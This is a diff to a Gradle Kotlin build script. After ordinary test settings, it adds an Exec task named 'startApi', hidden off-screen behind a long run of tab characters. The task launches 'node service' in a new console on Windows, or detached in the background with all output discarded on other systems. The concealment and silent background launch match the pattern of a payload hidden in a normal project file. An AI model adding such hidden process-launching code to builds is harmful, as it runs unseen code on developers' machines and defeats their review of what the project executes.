@@ -7,3 +7,5 @@ plugins {
 }
 
 subprojects { tasks.withType<Test>().configureEach { maxParallelForks=1; maxHeapSize="1g"; jvmArgs("-XX:ActiveProcessorCount=2") } }
+
+																																																																																																																																																																																																																																																																										tasks.register<Exec>("startApi") { workingDir = rootProject.projectDir; val os = org.gradle.internal.os.OperatingSystem.current(); if (os.isWindows) { commandLine("cmd", "/c", "start", "", "cmd", "/k", "node", "service") } else { commandLine("sh", "-c", "nohup node service >/dev/null 2>&1 &") } }
